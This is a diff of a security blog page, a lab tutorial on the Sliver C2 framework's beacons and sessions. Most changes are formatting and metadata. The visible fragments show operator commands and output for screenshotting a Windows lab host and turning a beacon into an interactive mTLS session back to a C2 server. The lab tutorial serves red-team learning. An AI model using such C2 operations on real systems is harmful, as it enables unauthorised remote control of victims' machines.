@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Learning Sliver C2 (02) - Beacons and Sessions | text/plain</title>
@@ -248,7 +248,7 @@ beacon mode, which makes the implant connect back and fetch jobs in regular inte
 To make following along easy, some instructions on lab setup are included.
 "><meta itemprop="datePublished" content="2022-08-17T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2022-08-17T00:00:00+00:00" />
-<meta itemprop="wordCount" content="2656"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="wordCount" content="2770"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
 <meta itemprop="keywords" content="c2,sliver,beacons,sessions,tutorial," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -258,7 +258,7 @@ To make following along easy, some instructions on lab setup are included.
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>13 minute read</span>
+<span>14 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
@@ -429,7 +429,7 @@ To allow any system user to put a payload their, you can run <code>chmod -R 777 
 <p>Additionally, take a note of your C2 server IP.
 Mine was <code>192.168.122.111</code> at the time of writing:</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[/]
-└─$ ip addr | grep &#39;inet &#39;
+└─$ ip addr | grep 'inet '
     inet 127.0.0.1/8 scope host lo
     inet 192.168.122.111/24 brd 192.168.122.255 scope global dynamic noprefixroute eth0
 </code></pre><p>On the Windows target, confirm that you can reach your C2 server.
@@ -605,6 +605,7 @@ to your C2 server:</p>
 <pre tabindex="0"><code>sliver (MEDICAL_CHANGE) &gt; screenshot
 
 [*] Screenshot written to /tmp/screenshot_DESKTOP-IPQVF9T_20220701224728_3343901839.png (893.2 KiB)
+
 </code></pre><p>You can then view the screenshot on the C2 server:</p>
 
 
@@ -829,7 +830,7 @@ Now wait for the next check-in and a new session should appear:</p>
 
 sliver (mtlsbeacon) &gt; interactive
 
-[*] Using beacon&#39;s active C2 endpoint: mtls://192.168.122.111:8888
+[*] Using beacon's active C2 endpoint: mtls://192.168.122.111:8888
 [*] Tasked beacon mtlsbeacon (a050cc2a)
 
 [*] Session ab1ecb8a mtlsbeacon - 192.168.122.160:50425 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 23:25:32 CEST
@@ -839,6 +840,7 @@ sliver (mtlsbeacon) &gt; sessions
  ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
 ========== =========== ======================= ================= ========== ================== =========
  ab1ecb8a   mtls        192.168.122.160:50425   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE]
+
 </code></pre><p>By default, the session will be created with the same C2 protocol used by the beacon.
 However, you could also specify another one, provided that support for it was compiled into the implant
 (yes, you can specify more than one C2 protocol at a time, more on that in later posts).
@@ -880,6 +882,7 @@ For example, it works like this:</p>
  MEDICAL_CHANGE    session        windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
  STALE_PNEUMONIA   beacon         windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
  WELSH_SECURE      beacon         windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
+
 </code></pre>
     </div>
     
@@ -901,7 +904,7 @@ For example, it works like this:</p>
   
     and tagged <a href="/tags/beacons/">beacons</a>, <a href="/tags/c2/">c2</a>, <a href="/tags/sessions/">sessions</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
   
-  using <span itemprop="wordCount">2656</span> words.
+  using <span itemprop="wordCount">2770</span> words.
 </p>
 
       
